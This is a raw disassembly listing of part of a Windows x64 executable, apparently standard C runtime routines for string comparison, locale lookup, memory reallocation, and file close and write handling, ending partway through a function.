   14000b0c0:	4c 8b da             	mov    %rdx,%r11
   14000b0c3:	4c 8b d1             	mov    %rcx,%r10
   14000b0c6:	4d 85 c0             	test   %r8,%r8
   14000b0c9:	75 03                	jne    0x14000b0ce
   14000b0cb:	33 c0                	xor    %eax,%eax
   14000b0cd:	c3                   	ret
   14000b0ce:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000b0d2:	4d 8d 52 02          	lea    0x2(%r10),%r10
   14000b0d6:	41 0f b7 13          	movzwl (%r11),%edx
   14000b0da:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000b0de:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000b0e1:	83 f8 19             	cmp    $0x19,%eax
   14000b0e4:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000b0e8:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000b0eb:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000b0ef:	83 f8 19             	cmp    $0x19,%eax
   14000b0f2:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000b0f5:	41 8b c1             	mov    %r9d,%eax
   14000b0f8:	0f 47 ca             	cmova  %edx,%ecx
   14000b0fb:	2b c1                	sub    %ecx,%eax
   14000b0fd:	75 0b                	jne    0x14000b10a
   14000b0ff:	45 85 c9             	test   %r9d,%r9d
   14000b102:	74 06                	je     0x14000b10a
   14000b104:	49 83 e8 01          	sub    $0x1,%r8
   14000b108:	75 c4                	jne    0x14000b0ce
   14000b10a:	c3                   	ret
   14000b10b:	cc                   	int3
   14000b10c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b111:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b116:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b11b:	57                   	push   %rdi
   14000b11c:	41 56                	push   %r14
   14000b11e:	41 57                	push   %r15
   14000b120:	48 83 ec 20          	sub    $0x20,%rsp
   14000b124:	4c 8b f1             	mov    %rcx,%r14
   14000b127:	48 85 c9             	test   %rcx,%rcx
   14000b12a:	74 4a                	je     0x14000b176
   14000b12c:	33 db                	xor    %ebx,%ebx
   14000b12e:	4c 8d 3d cb 4e ff ff 	lea    -0xb135(%rip),%r15        # 0x140000000
   14000b135:	bf e3 00 00 00       	mov    $0xe3,%edi
   14000b13a:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   14000b13d:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000b143:	99                   	cltd
   14000b144:	49 8b ce             	mov    %r14,%rcx
   14000b147:	2b c2                	sub    %edx,%eax
   14000b149:	d1 f8                	sar    $1,%eax
   14000b14b:	48 63 e8             	movslq %eax,%rbp
   14000b14e:	48 8b d5             	mov    %rbp,%rdx
   14000b151:	48 8b f5             	mov    %rbp,%rsi
   14000b154:	48 03 d2             	add    %rdx,%rdx
   14000b157:	49 8b 94 d7 40 34 01 	mov    0x13440(%r15,%rdx,8),%rdx
   14000b15e:	00 
   14000b15f:	e8 5c ff ff ff       	call   0x14000b0c0
   14000b164:	85 c0                	test   %eax,%eax
   14000b166:	74 29                	je     0x14000b191
   14000b168:	79 05                	jns    0x14000b16f
   14000b16a:	8d 7d ff             	lea    -0x1(%rbp),%edi
   14000b16d:	eb 03                	jmp    0x14000b172
   14000b16f:	8d 5d 01             	lea    0x1(%rbp),%ebx
   14000b172:	3b df                	cmp    %edi,%ebx
   14000b174:	7e c4                	jle    0x14000b13a
   14000b176:	33 c0                	xor    %eax,%eax
   14000b178:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000b17d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000b182:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000b187:	48 83 c4 20          	add    $0x20,%rsp
   14000b18b:	41 5f                	pop    %r15
   14000b18d:	41 5e                	pop    %r14
   14000b18f:	5f                   	pop    %rdi
   14000b190:	c3                   	ret
   14000b191:	48 03 f6             	add    %rsi,%rsi
   14000b194:	49 63 84 f7 48 34 01 	movslq 0x13448(%r15,%rsi,8),%rax
   14000b19b:	00 
   14000b19c:	85 c0                	test   %eax,%eax
   14000b19e:	78 d6                	js     0x14000b176
   14000b1a0:	3d e4 00 00 00       	cmp    $0xe4,%eax
   14000b1a5:	73 cf                	jae    0x14000b176
   14000b1a7:	48 03 c0             	add    %rax,%rax
   14000b1aa:	41 8b 84 c7 e0 19 01 	mov    0x119e0(%r15,%rax,8),%eax
   14000b1b1:	00 
   14000b1b2:	eb c4                	jmp    0x14000b178
   14000b1b4:	48 83 ec 28          	sub    $0x28,%rsp
   14000b1b8:	48 85 c9             	test   %rcx,%rcx
   14000b1bb:	75 19                	jne    0x14000b1d6
   14000b1bd:	e8 92 c2 ff ff       	call   0x140007454
   14000b1c2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b1c8:	e8 2f c0 ff ff       	call   0x1400071fc
   14000b1cd:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b1d1:	48 83 c4 28          	add    $0x28,%rsp
   14000b1d5:	c3                   	ret
   14000b1d6:	4c 8b c1             	mov    %rcx,%r8
   14000b1d9:	33 d2                	xor    %edx,%edx
   14000b1db:	48 8b 0d a6 f5 00 00 	mov    0xf5a6(%rip),%rcx        # 0x14001a788
   14000b1e2:	48 83 c4 28          	add    $0x28,%rsp
   14000b1e6:	48 ff 25 13 40 00 00 	rex.W jmp *0x4013(%rip)        # 0x14000f200
   14000b1ed:	cc                   	int3
   14000b1ee:	cc                   	int3
   14000b1ef:	cc                   	int3
   14000b1f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b1f5:	57                   	push   %rdi
   14000b1f6:	48 83 ec 20          	sub    $0x20,%rsp
   14000b1fa:	48 8b da             	mov    %rdx,%rbx
   14000b1fd:	48 8b f9             	mov    %rcx,%rdi
   14000b200:	48 85 c9             	test   %rcx,%rcx
   14000b203:	75 0a                	jne    0x14000b20f
   14000b205:	48 8b ca             	mov    %rdx,%rcx
   14000b208:	e8 af df ff ff       	call   0x1400091bc
   14000b20d:	eb 1f                	jmp    0x14000b22e
   14000b20f:	48 85 db             	test   %rbx,%rbx
   14000b212:	75 07                	jne    0x14000b21b
   14000b214:	e8 d3 c2 ff ff       	call   0x1400074ec
   14000b219:	eb 11                	jmp    0x14000b22c
   14000b21b:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000b21f:	76 2d                	jbe    0x14000b24e
   14000b221:	e8 2e c2 ff ff       	call   0x140007454
   14000b226:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000b22c:	33 c0                	xor    %eax,%eax
   14000b22e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b233:	48 83 c4 20          	add    $0x20,%rsp
   14000b237:	5f                   	pop    %rdi
   14000b238:	c3                   	ret
   14000b239:	e8 e2 ac ff ff       	call   0x140005f20
   14000b23e:	85 c0                	test   %eax,%eax
   14000b240:	74 df                	je     0x14000b221
   14000b242:	48 8b cb             	mov    %rbx,%rcx
   14000b245:	e8 be eb ff ff       	call   0x140009e08
   14000b24a:	85 c0                	test   %eax,%eax
   14000b24c:	74 d3                	je     0x14000b221
   14000b24e:	48 8b 0d 33 f5 00 00 	mov    0xf533(%rip),%rcx        # 0x14001a788
   14000b255:	4c 8b cb             	mov    %rbx,%r9
   14000b258:	4c 8b c7             	mov    %rdi,%r8
   14000b25b:	33 d2                	xor    %edx,%edx
   14000b25d:	ff 15 a5 3f 00 00    	call   *0x3fa5(%rip)        # 0x14000f208
   14000b263:	48 85 c0             	test   %rax,%rax
   14000b266:	74 d1                	je     0x14000b239
   14000b268:	eb c4                	jmp    0x14000b22e
   14000b26a:	cc                   	int3
   14000b26b:	cc                   	int3
   14000b26c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b271:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000b276:	57                   	push   %rdi
   14000b277:	48 83 ec 20          	sub    $0x20,%rsp
   14000b27b:	49 8b f9             	mov    %r9,%rdi
   14000b27e:	49 8b d8             	mov    %r8,%rbx
   14000b281:	8b 0a                	mov    (%rdx),%ecx
   14000b283:	e8 6c d8 ff ff       	call   0x140008af4
   14000b288:	90                   	nop
   14000b289:	48 8b 03             	mov    (%rbx),%rax
   14000b28c:	48 63 08             	movslq (%rax),%rcx
   14000b28f:	48 8b d1             	mov    %rcx,%rdx
   14000b292:	48 8b c1             	mov    %rcx,%rax
   14000b295:	48 c1 f8 06          	sar    $0x6,%rax
   14000b299:	4c 8d 05 40 ef 00 00 	lea    0xef40(%rip),%r8        # 0x14001a1e0
   14000b2a0:	83 e2 3f             	and    $0x3f,%edx
   14000b2a3:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000b2a7:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000b2ab:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000b2b0:	74 23                	je     0x14000b2d5
   14000b2b2:	e8 49 d9 ff ff       	call   0x140008c00
   14000b2b7:	48 8b c8             	mov    %rax,%rcx
   14000b2ba:	ff 15 50 3f 00 00    	call   *0x3f50(%rip)        # 0x14000f210
   14000b2c0:	33 db                	xor    %ebx,%ebx
   14000b2c2:	85 c0                	test   %eax,%eax
   14000b2c4:	75 1d                	jne    0x14000b2e3
   14000b2c6:	ff 15 c4 3d 00 00    	call   *0x3dc4(%rip)        # 0x14000f090
   14000b2cc:	8b d8                	mov    %eax,%ebx
   14000b2ce:	e8 61 c1 ff ff       	call   0x140007434
   14000b2d3:	89 18                	mov    %ebx,(%rax)
   14000b2d5:	e8 7a c1 ff ff       	call   0x140007454
   14000b2da:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b2e0:	83 cb ff             	or     $0xffffffff,%ebx
   14000b2e3:	8b 0f                	mov    (%rdi),%ecx
   14000b2e5:	e8 32 d8 ff ff       	call   0x140008b1c
   14000b2ea:	8b c3                	mov    %ebx,%eax
   14000b2ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b2f1:	48 83 c4 20          	add    $0x20,%rsp
   14000b2f5:	5f                   	pop    %rdi
   14000b2f6:	c3                   	ret
   14000b2f7:	cc                   	int3
   14000b2f8:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000b2fc:	48 83 ec 38          	sub    $0x38,%rsp
   14000b300:	48 63 d1             	movslq %ecx,%rdx
   14000b303:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000b306:	75 0d                	jne    0x14000b315
   14000b308:	e8 47 c1 ff ff       	call   0x140007454
   14000b30d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b313:	eb 6c                	jmp    0x14000b381
   14000b315:	85 c9                	test   %ecx,%ecx
   14000b317:	78 58                	js     0x14000b371
   14000b319:	3b 15 c1 f2 00 00    	cmp    0xf2c1(%rip),%edx        # 0x14001a5e0
   14000b31f:	73 50                	jae    0x14000b371
   14000b321:	48 8b ca             	mov    %rdx,%rcx
   14000b324:	4c 8d 05 b5 ee 00 00 	lea    0xeeb5(%rip),%r8        # 0x14001a1e0
   14000b32b:	83 e1 3f             	and    $0x3f,%ecx
   14000b32e:	48 8b c2             	mov    %rdx,%rax
   14000b331:	48 c1 f8 06          	sar    $0x6,%rax
   14000b335:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000b339:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000b33d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000b342:	74 2d                	je     0x14000b371
   14000b344:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000b349:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000b34d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000b351:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000b356:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000b35b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b360:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000b365:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000b36a:	e8 fd fe ff ff       	call   0x14000b26c
   14000b36f:	eb 13                	jmp    0x14000b384
   14000b371:	e8 de c0 ff ff       	call   0x140007454
   14000b376:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b37c:	e8 7b be ff ff       	call   0x1400071fc
   14000b381:	83 c8 ff             	or     $0xffffffff,%eax
   14000b384:	48 83 c4 38          	add    $0x38,%rsp
   14000b388:	c3                   	ret
   14000b389:	cc                   	int3
   14000b38a:	cc                   	int3
   14000b38b:	cc                   	int3
   14000b38c:	48 8b c4             	mov    %rsp,%rax
   14000b38f:	55                   	push   %rbp
   14000b390:	56                   	push   %rsi
   14000b391:	57                   	push   %rdi
   14000b392:	41 54                	push   %r12
   14000b394:	41 55                	push   %r13
   14000b396:	41 56                	push   %r14
   14000b398:	41 57                	push   %r15
   14000b39a:	48 8d 68 a9          	lea    -0x57(%rax),%rbp
   14000b39e:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000b3a5:	48 c7 45 f7 fe ff ff 	movq   $0xfffffffffffffffe,-0x9(%rbp)
   14000b3ac:	ff 
   14000b3ad:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000b3b1:	48 8b 05 88 dc 00 00 	mov    0xdc88(%rip),%rax        # 0x140019040
   14000b3b8:	48 33 c4             	xor    %rsp,%rax
   14000b3bb:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000b3bf:	49 8b f0             	mov    %r8,%rsi
   14000b3c2:	4c 89 45 b7          	mov    %r8,-0x49(%rbp)
   14000b3c6:	4c 63 f2             	movslq %edx,%r14
   14000b3c9:	48 8b d9             	mov    %rcx,%rbx
   14000b3cc:	4c 8b 6d 7f          	mov    0x7f(%rbp),%r13
   14000b3d0:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   14000b3d4:	49 8b ce             	mov    %r14,%rcx
   14000b3d7:	48 89 4d e7          	mov    %rcx,-0x19(%rbp)
   14000b3db:	49 8b c6             	mov    %r14,%rax
   14000b3de:	48 c1 f8 06          	sar    $0x6,%rax
   14000b3e2:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   14000b3e6:	48 8d 15 13 4c ff ff 	lea    -0xb3ed(%rip),%rdx        # 0x140000000
   14000b3ed:	83 e1 3f             	and    $0x3f,%ecx
   14000b3f0:	48 89 4d ef          	mov    %rcx,-0x11(%rbp)
   14000b3f4:	4c 8d 3c c9          	lea    (%rcx,%rcx,8),%r15
   14000b3f8:	48 8b 84 c2 e0 a1 01 	mov    0x1a1e0(%rdx,%rax,8),%rax
   14000b3ff:	00 
   14000b400:	4a 8b 44 f8 28       	mov    0x28(%rax,%r15,8),%rax
   14000b405:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   14000b409:	45 8b e1             	mov    %r9d,%r12d
   14000b40c:	4d 03 e0             	add    %r8,%r12
   14000b40f:	4c 89 65 8f          	mov    %r12,-0x71(%rbp)
   14000b413:	ff 15 ff 3d 00 00    	call   *0x3dff(%rip)        # 0x14000f218
   14000b419:	89 45 9f             	mov    %eax,-0x61(%rbp)
   14000b41c:	33 ff                	xor    %edi,%edi
   14000b41e:	41 38 7d 28          	cmp    %dil,0x28(%r13)
   14000b422:	75 08                	jne    0x14000b42c
   14000b424:	49 8b cd             	mov    %r13,%rcx
   14000b427:	e8 34 b2 ff ff       	call   0x140006660
   14000b42c:	49 8b 4d 18          	mov    0x18(%r13),%rcx
   14000b430:	44 8b 41 0c          	mov    0xc(%rcx),%r8d
   14000b434:	44 89 45 a3          	mov    %r8d,-0x5d(%rbp)
   14000b438:	33 c0                	xor    %eax,%eax
   14000b43a:	48 89 03             	mov    %rax,(%rbx)
   14000b43d:	89 43 08             	mov    %eax,0x8(%rbx)
   14000b440:	4c 39 65 b7          	cmp    %r12,-0x49(%rbp)
   14000b444:	0f 83 a2 03 00 00    	jae    0x14000b7ec
   14000b44a:	49 8b c6             	mov    %r14,%rax
   14000b44d:	48 c1 f8 06          	sar    $0x6,%rax
   14000b451:	48 89 45 df          	mov    %rax,-0x21(%rbp)
   14000b455:	8b d7                	mov    %edi,%edx
   14000b457:	8a 0e                	mov    (%rsi),%cl
   14000b459:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   14000b45d:	89 7d 83             	mov    %edi,-0x7d(%rbp)
   14000b460:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000b466:	4c 8d 1d 93 4b ff ff 	lea    -0xb46d(%rip),%r11        # 0x140000000
   14000b46d:	41 81 f8 e9 fd 00 00 	cmp    $0xfde9,%r8d
   14000b474:	0f 85 7a 01 00 00    	jne    0x14000b5f4
   14000b47a:	8b d7                	mov    %edi,%edx
   14000b47c:	4c 8b f7             	mov    %rdi,%r14
   14000b47f:	49 8b 84 c3 e0 a1 01 	mov    0x1a1e0(%r11,%rax,8),%rax
   14000b486:	00 
   14000b487:	4e 8d 0c fd 3e 00 00 	lea    0x3e(,%r15,8),%r9
   14000b48e:	00 
   14000b48f:	4c 03 c8             	add    %rax,%r9
   14000b492:	49 8b c1             	mov    %r9,%rax
   14000b495:	40 38 38             	cmp    %dil,(%rax)
   14000b498:	74 0e                	je     0x14000b4a8
   14000b49a:	ff c2                	inc    %edx
   14000b49c:	49 ff c6             	inc    %r14
   14000b49f:	48 ff c0             	inc    %rax
   14000b4a2:	49 83 fe 05          	cmp    $0x5,%r14
   14000b4a6:	7c ed                	jl     0x14000b495
   14000b4a8:	4d 85 f6             	test   %r14,%r14
   14000b4ab:	0f 84 d5 00 00 00    	je     0x14000b586
   14000b4b1:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000b4b5:	4b 8b 84 d3 e0 a1 01 	mov    0x1a1e0(%r11,%r10,8),%rax
   14000b4bc:	00 
   14000b4bd:	42 0f b6 4c f8 3e    	movzbl 0x3e(%rax,%r15,8),%ecx
   14000b4c3:	46 0f be a4 19 30 99 	movsbl 0x19930(%rcx,%r11,1),%r12d
   14000b4ca:	01 00 
   14000b4cc:	41 ff c4             	inc    %r12d
   14000b4cf:	41 8b c4             	mov    %r12d,%eax
   14000b4d2:	2b c2                	sub    %edx,%eax
   14000b4d4:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000b4d7:	48 8b 55 8f          	mov    -0x71(%rbp),%rdx
   14000b4db:	48 2b d6             	sub    %rsi,%rdx
   14000b4de:	4c 63 c0             	movslq %eax,%r8
   14000b4e1:	4c 3b c2             	cmp    %rdx,%r8
   14000b4e4:	0f 8f 71 02 00 00    	jg     0x14000b75b
   14000b4ea:	48 8b cf             	mov    %rdi,%rcx
   14000b4ed:	41 8a 01             	mov    (%r9),%al
   14000b4f0:	88 44 0d ff          	mov    %al,-0x1(%rbp,%rcx,1)
   14000b4f4:	48 ff c1             	inc    %rcx
   14000b4f7:	49 ff c1             	inc    %r9
   14000b4fa:	49 3b ce             	cmp    %r14,%rcx
   14000b4fd:	7c ee                	jl     0x14000b4ed
   14000b4ff:	4d 85 c0             	test   %r8,%r8
   14000b502:	7e 1a                	jle    0x14000b51e
   14000b504:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000b508:	49 03 ce             	add    %r14,%rcx
   14000b50b:	48 8b d6             	mov    %rsi,%rdx
   14000b50e:	e8 9d 2c 00 00       	call   0x14000e1b0
   14000b513:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000b517:	4c 8d 1d e2 4a ff ff 	lea    -0xb51e(%rip),%r11        # 0x140000000
   14000b51e:	48 8b d7             	mov    %rdi,%rdx
   14000b521:	4b 8b 8c d3 e0 a1 01 	mov    0x1a1e0(%r11,%r10,8),%rcx
   14000b528:	00 
   14000b529:	48 03 ca             	add    %rdx,%rcx
   14000b52c:	42 88 7c f9 3e       	mov    %dil,0x3e(%rcx,%r15,8)
   14000b531:	48 ff c2             	inc    %rdx
   14000b534:	49 3b d6             	cmp    %r14,%rdx
   14000b537:	7c e8                	jl     0x14000b521
   14000b539:	48 89 7d bf          	mov    %rdi,-0x41(%rbp)
   14000b53d:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000b541:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   14000b545:	8b c7                	mov    %edi,%eax
   14000b547:	41 83 fc 04          	cmp    $0x4,%r12d
   14000b54b:	0f 94 c0             	sete   %al
   14000b54e:	ff c0                	inc    %eax
   14000b550:	44 8b e0             	mov    %eax,%r12d
   14000b553:	44 8b c0             	mov    %eax,%r8d
   14000b556:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000b55b:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   14000b55f:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000b563:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000b567:	e8 0c 0c 00 00       	call   0x14000c178
   14000b56c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b570:	0f 84 76 02 00 00    	je     0x14000b7ec
   14000b576:	8b 45 97             	mov    -0x69(%rbp),%eax
   14000b579:	ff c8                	dec    %eax
   14000b57b:	48 63 c8             	movslq %eax,%rcx
   14000b57e:	48 03 f1             	add    %rcx,%rsi
   14000b581:	e9 03 01 00 00       	jmp    0x14000b689
   14000b586:	0f b6 06             	movzbl (%rsi),%eax
   14000b589:	4e 0f be ac 18 30 99 	movsbq 0x19930(%rax,%r11,1),%r13
   14000b590:	01 00 
   14000b592:	41 8d 4d 01          	lea    0x1(%r13),%ecx
   14000b596:	4c 8b 45 8f          	mov    -0x71(%rbp),%r8
   14000b59a:	4c 2b c6             	sub    %rsi,%r8
   14000b59d:	48 63 c1             	movslq %ecx,%rax
   14000b5a0:	49 3b c0             	cmp    %r8,%rax
   14000b5a3:	0f 8f e0 01 00 00    	jg     0x14000b789
   14000b5a9:	48 89 7d 97          	mov    %rdi,-0x69(%rbp)
   14000b5ad:	48 89 75 cf          	mov    %rsi,-0x31(%rbp)
   14000b5b1:	8b c7                	mov    %edi,%eax
   14000b5b3:	83 f9 04             	cmp    $0x4,%ecx
   14000b5b6:	0f 94 c0             	sete   %al
   14000b5b9:	ff c0                	inc    %eax
   14000b5bb:	44 8b f0             	mov    %eax,%r14d
   14000b5be:	44 8b c0             	mov    %eax,%r8d
   14000b5c1:	48 8b 45 af          	mov    -0x51(%rbp),%rax
   14000b5c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b5ca:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   14000b5ce:	48 8d 55 cf          	lea    -0x31(%rbp),%rdx
   14000b5d2:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000b5d6:	e8 9d 0b 00 00       	call   0x14000c178
   14000b5db:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b5df:	0f 84 07 02 00 00    	je     0x14000b7ec
   14000b5e5:	49 03 f5             	add    %r13,%rsi
   14000b5e8:	45 8b e6             	mov    %r14d,%r12d
   14000b5eb:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   14000b5ef:	e9 95 00 00 00       	jmp    0x14000b689
   14000b5f4:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000b5f8:	4f 8b 8c d3 e0 a1 01 	mov    0x1a1e0(%r11,%r10,8),%r9
   14000b5ff:	00 
   14000b600:	43 8a 4c f9 3d       	mov    0x3d(%r9,%r15,8),%cl
   14000b605:	f6 c1 04             	test   $0x4,%cl
   14000b608:	74 21                	je     0x14000b62b
   14000b60a:	43 8a 44 f9 3e       	mov    0x3e(%r9,%r15,8),%al
   14000b60f:	88 45 07             	mov    %al,0x7(%rbp)
   14000b612:	8a 06                	mov    (%rsi),%al
   14000b614:	88 45 08             	mov    %al,0x8(%rbp)
   14000b617:	80 e1 fb             	and    $0xfb,%cl
   14000b61a:	43 88 4c f9 3d       	mov    %cl,0x3d(%r9,%r15,8)
   14000b61f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b625:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000b629:	eb 49                	jmp    0x14000b674
   14000b62b:	44 0f b6 06          	movzbl (%rsi),%r8d
   14000b62f:	49 8b 45 18          	mov    0x18(%r13),%rax
   14000b633:	48 8b 08             	mov    (%rax),%rcx
   14000b636:	66 42 39 3c 41       	cmp    %di,(%rcx,%r8,2)
   14000b63b:	7d 31                	jge    0x14000b66e
   14000b63d:	4c 8d 76 01          	lea    0x1(%rsi),%r14
   14000b641:	4c 3b 75 8f          	cmp    -0x71(%rbp),%r14
   14000b645:	0f 83 7c 01 00 00    	jae    0x14000b7c7
   14000b64b:	4d 8b cd             	mov    %r13,%r9
   14000b64e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b654:	48 8b d6             	mov    %rsi,%rdx
   14000b657:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000b65b:	e8 e0 f0 ff ff       	call   0x14000a740
   14000b660:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b663:	0f 84 83 01 00 00    	je     0x14000b7ec
   14000b669:	49 8b f6             	mov    %r14,%rsi
   14000b66c:	eb 1b                	jmp    0x14000b689
   14000b66e:	4d 8b c4             	mov    %r12,%r8
   14000b671:	48 8b d6             	mov    %rsi,%rdx
   14000b674:	4d 8b cd             	mov    %r13,%r9
   14000b677:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000b67b:	e8 c0 f0 ff ff       	call   0x14000a740
   14000b680:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b683:	0f 84 63 01 00 00    	je     0x14000b7ec
   14000b689:	48 ff c6             	inc    %rsi
   14000b68c:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000b691:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000b696:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000b69d:	00 
   14000b69e:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000b6a2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b6a7:	45 8b cc             	mov    %r12d,%r9d
   14000b6aa:	4c 8d 45 83          	lea    -0x7d(%rbp),%r8
   14000b6ae:	33 d2                	xor    %edx,%edx
   14000b6b0:	8b 4d 9f             	mov    -0x61(%rbp),%ecx
   14000b6b3:	e8 5c d0 ff ff       	call   0x140008714
   14000b6b8:	44 8b f0             	mov    %eax,%r14d
   14000b6bb:	85 c0                	test   %eax,%eax
   14000b6bd:	0f 84 29 01 00 00    	je     0x14000b7ec
   14000b6c3:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000b6c8:	4c 8d 4d 87          	lea    -0x79(%rbp),%r9
   14000b6cc:	44 8b c0             	mov    %eax,%r8d
   14000b6cf:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000b6d3:	4c 8b 65 d7          	mov    -0x29(%rbp),%r12
   14000b6d7:	49 8b cc             	mov    %r12,%rcx
   14000b6da:	ff 15 38 3a 00 00    	call   *0x3a38(%rip)        # 0x14000f118
   14000b6e0:	85 c0                	test   %eax,%eax
   14000b6e2:	0f 84 fc 00 00 00    	je     0x14000b7e4
   14000b6e8:	8b d6                	mov    %esi,%edx
   14000b6ea:	2b 55 b7             	sub    -0x49(%rbp),%edx
   14000b6ed:	03 53 08             	add    0x8(%rbx),%edx
   14000b6f0:	89 53 04             	mov    %edx,0x4(%rbx)
   14000b6f3:	44 39 75 87          	cmp    %r14d,-0x79(%rbp)
   14000b6f7:	0f 82 ef 00 00 00    	jb     0x14000b7ec
   14000b6fd:	80 7c 24 40 0a       	cmpb   $0xa,0x40(%rsp)
   14000b702:	75 40                	jne    0x14000b744
   14000b704:	b8 0d 00 00 00       	mov    $0xd,%eax
   14000b709:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   14000b70e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000b713:	4c 8d 4d 87          	lea    -0x79(%rbp),%r9
   14000b717:	44 8d 40 f4          	lea    -0xc(%rax),%r8d
   14000b71b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000b720:	49 8b cc             	mov    %r12,%rcx
   14000b723:	ff 15 ef 39 00 00    	call   *0x39ef(%rip)        # 0x14000f118
   14000b729:	85 c0                	test   %eax,%eax
   14000b72b:	0f 84 b3 00 00 00    	je     0x14000b7e4
   14000b731:	83 7d 87 01          	cmpl   $0x1,-0x79(%rbp)
   14000b735:	0f 82 b1 00 00 00    	jb     0x14000b7ec
   14000b73b:	ff 43 08             	incl   0x8(%rbx)
   14000b73e:	ff 43 04             	incl   0x4(%rbx)
   14000b741:	8b 53 04             	mov    0x4(%rbx),%edx
   14000b744:	48 3b 75 8f          	cmp    -0x71(%rbp),%rsi
   14000b748:	0f 83 9e 00 00 00    	jae    0x14000b7ec
   14000b74e:	48 8b 45 df          	mov    -0x21(%rbp),%rax
   14000b752:	44 8b 45 a3          	mov    -0x5d(%rbp),%r8d
   14000b756:	e9 fc fc ff ff       	jmp    0x14000b457
   14000b75b:	48 85 d2             	test   %rdx,%rdx
   14000b75e:	7e 24                	jle    0x14000b784
   14000b760:	49 2b f6             	sub    %r14,%rsi
   14000b763:	4b 8b 8c d3 e0 a1 01 	mov    0x1a1e0(%r11,%r10,8),%rcx
   14000b76a:	00 
   14000b76b:	49 03 ce             	add    %r14,%rcx
   14000b76e:	42 8a 04 36          	mov    (%rsi,%r14,1),%al
   14000b772:	42 88 44 f9 3e       	mov    %al,0x3e(%rcx,%r15,8)
   14000b777:	ff c7                	inc    %edi
   14000b779:	49 ff c6             	inc    %r14
